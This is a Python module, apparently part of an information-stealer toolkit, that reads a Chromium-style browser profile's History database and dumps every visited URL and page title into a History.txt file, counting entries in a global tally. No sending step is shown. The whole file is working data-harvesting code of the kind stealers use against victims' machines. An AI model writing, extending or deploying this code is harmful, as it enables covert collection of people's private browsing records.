import os
import csv
import sqlite3

#------------------------------------------------------------------
from modules.Browsers._data_breeding_ import History
#------------------------------------------------------------------
import log_Style

def get_web_history(profilePath: str, historyFile) -> None:
    
    web_history_db: str = f'{profilePath}\\History'
    if not os.path.exists(web_history_db):
        return None
    
    try:
        with sqlite3.connect(web_history_db) as conn:
            cursor: object = conn.cursor()
            cursor.execute('SELECT url, title FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                
                log_Style.ALL_HISTORY += 1
                with open(f'{historyFile}\\History.txt', "a", encoding='utf-8', errors='ignore') as history:
                    h = History(row[1], row[0])
                    history.write(str(h))
                
    except Exception as e:
        print(e)

